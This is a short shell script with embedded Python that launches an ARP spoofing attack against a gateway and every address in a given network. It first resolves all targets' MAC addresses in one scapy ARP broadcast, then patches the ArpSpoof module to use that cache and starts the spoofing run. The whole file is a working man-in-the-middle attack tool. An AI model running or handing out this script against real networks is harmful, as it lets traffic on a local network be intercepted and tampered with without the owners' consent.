#!/bin/sh
if [ "${#}" -eq 2 ]; then
	GW="${1}"
    NETWORK="${2}"
    set -e
    # ArpSpoof resolves each address serially (2 s per silent one); resolve them all in one burst instead.
    python3 - "${GW}" "${NETWORK}" -s -t 0.1 <<'PY'
import sys
from socket import gethostbyname
from scapy.all import ARP, Ether, srp
from PythonToolsKit.GetType import get_ipv4_addresses
import ArpSpoof
ips = [gethostbyname(sys.argv[1])] + [str(ip) for ip in get_ipv4_addresses(sys.argv[2])]
answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ips), timeout=2, verbose=0)
macs = {reply[ARP].psrc: reply[ARP].hwsrc for _, reply in answered}
ArpSpoof.getmacbyip = lambda ip, chainCC=0: macs.get(ip)
sys.argv[0] = "ArpSpoof"
sys.exit(ArpSpoof.main())
PY
fi
